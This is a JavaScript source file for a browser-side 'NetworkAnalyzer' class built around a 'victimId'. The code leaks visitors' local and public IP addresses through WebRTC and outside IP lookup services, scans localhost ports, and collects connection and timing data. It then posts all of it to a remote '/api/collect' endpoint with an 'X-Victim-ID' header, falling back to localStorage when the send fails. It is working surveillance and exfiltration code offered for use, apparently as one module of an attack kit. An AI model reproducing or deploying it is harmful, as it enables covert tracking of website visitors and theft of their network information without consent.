class NetworkAnalyzer {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.networkData = {};
    }

    async analyzeNetwork() {
        try {
            // Basic network information
            await this.collectBasicNetworkInfo();
            
            // Connection information
            await this.analyzeConnection();
            
            // IP address detection
            await this.detectIPAddress();
            
            // Network timing analysis
            await this.analyzeNetworkTiming();
            
            // DNS information
            await this.collectDNSInfo();
            
            // Send network data
            await this.sendNetworkData();
            
            return this.networkData;
            
        } catch (error) {
            console.error('Network analysis error:', error);
            await this.sendError('network_error', error);
            return null;
        }
    }

    collectBasicNetworkInfo() {
        this.networkData.basic = {
            onLine: navigator.onLine,
            connection: navigator.connection ? true : false,
            geolocation: navigator.geolocation ? true : false,
            serviceWorker: 'serviceWorker' in navigator,
            webRTC: !!window.RTCPeerConnection,
            webSocket: !!window.WebSocket
        };
    }

    analyzeConnection() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        if (connection) {
            this.networkData.connection = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData,
                type: connection.type,
                downlinkMax: connection.downlinkMax
            };
        } else {
            this.networkData.connection = { supported: false };
        }
    }

    async detectIPAddress() {
        try {
            // Method 1: Using WebRTC (most accurate)
            const rtcIP = await this.getIPViaWebRTC();
            if (rtcIP) {
                this.networkData.ip = {
                    address: rtcIP,
                    method: 'webrtc',
                    timestamp: Date.now()
                };
                return;
            }

            // Method 2: Using external service
            const externalIP = await this.getIPViaExternalService();
            if (externalIP) {
                this.networkData.ip = {
                    address: externalIP,
                    method: 'external_service',
                    timestamp: Date.now()
                };
                return;
            }

            this.networkData.ip = { error: 'Could not detect IP address' };

        } catch (error) {
            this.networkData.ip = { error: error.message };
        }
    }

    getIPViaWebRTC() {
        return new Promise((resolve) => {
            try {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve(null);
                    return;
                }

                const pc = new RTCPeerConnection({ iceServers: [] });
                let ip = null;

                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => resolve(null));

                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        pc.close();
                        resolve(ip);
                        return;
                    }

                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        ip = match[1];
                    }
                };

                // Timeout after 3 seconds
                setTimeout(() => {
                    pc.close();
                    resolve(ip);
                }, 3000);

            } catch (error) {
                resolve(null);
            }
        });
    }

    async getIPViaExternalService() {
        try {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json/'
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service, {
                        method: 'GET',
                        mode: 'cors',
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });

                    if (response.ok) {
                        const data = await response.json();
                        return data.ip || data.query;
                    }
                } catch (error) {
                    continue;
                }
            }

            return null;

        } catch (error) {
            return null;
        }
    }

    async analyzeNetworkTiming() {
        const resources = [
            this.serverUrl + '/',
            'https://www.google.com/favicon.ico',
            'https://www.cloudflare.com/favicon.ico'
        ];

        const timingResults = [];

        for (const resource of resources) {
            try {
                const startTime = performance.now();
                const response = await fetch(resource, {
                    method: 'HEAD',
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                const endTime = performance.now();

                timingResults.push({
                    resource: resource,
                    responseTime: endTime - startTime,
                    status: response.status,
                    success: response.ok
                });

            } catch (error) {
                timingResults.push({
                    resource: resource,
                    error: error.message,
                    success: false
                });
            }
        }

        this.networkData.timing = {
            results: timingResults,
            averageResponseTime: timingResults.reduce((sum, result) => sum + (result.responseTime || 0), 0) / timingResults.length
        };
    }

    collectDNSInfo() {
        // Collect DNS information from performance entries
        const dnsEntries = performance.getEntriesByType('resource')
            .filter(entry => entry.name.includes('http') || entry.name.includes('https'))
            .map(entry => ({
                name: entry.name,
                domain: new URL(entry.name).hostname,
                dnsLookup: entry.domainLookupEnd - entry.domainLookupStart,
                tcpConnect: entry.connectEnd - entry.connectStart,
                responseTime: entry.responseEnd - entry.requestStart,
                totalTime: entry.duration
            }));

        this.networkData.dns = {
            entries: dnsEntries,
            totalEntries: dnsEntries.length,
            averageDNSTime: dnsEntries.reduce((sum, entry) => sum + entry.dnsLookup, 0) / dnsEntries.length
        };
    }

    async checkPortAvailability() {
        const commonPorts = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995];
        const portResults = [];

        for (const port of commonPorts) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1000);

                const response = await fetch(`http://localhost:${port}`, {
                    method: 'HEAD',
                    mode: 'no-cors',
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                portResults.push({ port: port, open: true });

            } catch (error) {
                portResults.push({ port: port, open: false });
            }
        }

        this.networkData.ports = {
            scanned: commonPorts,
            results: portResults,
            openPorts: portResults.filter(result => result.open).length
        };
    }

    async detectLocalNetwork() {
        try {
            const localIPs = await this.getLocalIPs();
            this.networkData.local = {
                ips: localIPs,
                count: localIPs.length
            };
        } catch (error) {
            this.networkData.local = { error: error.message };
        }
    }

    getLocalIPs() {
        return new Promise((resolve) => {
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            
            if (!RTCPeerConnection) {
                resolve([]);
                return;
            }

            const pc = new RTCPeerConnection({ iceServers: [] });
            const ips = [];

            pc.createDataChannel('');
            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(() => resolve([]));

            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    pc.close();
                    resolve(ips);
                    return;
                }

                const candidate = event.candidate.candidate;
                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = candidate.match(regex);
                
                if (match && !ips.includes(match[1])) {
                    ips.push(match[1]);
                }
            };

            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 3000);
        });
    }

    async sendNetworkData() {
        return this.sendToServer('network', this.networkData);
    }

    async sendError(type, error) {
        return this.sendToServer('error', {
            type: type,
            message: error.message,
            stack: error.stack
        });
    }

    async sendToServer(type, data) {
        try {
            const response = await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: type,
                    payload: data,
                    timestamp: Date.now()
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.warn('Failed to send network data:', error);
            this.storeLocally(type, data);
            return null;
        }
    }

    storeLocally(type, data) {
        try {
            const key = `network_${type}_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now(),
                victimId: this.victimId
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }
}

// Export for use in other modules
window.NetworkAnalyzer = NetworkAnalyzer;
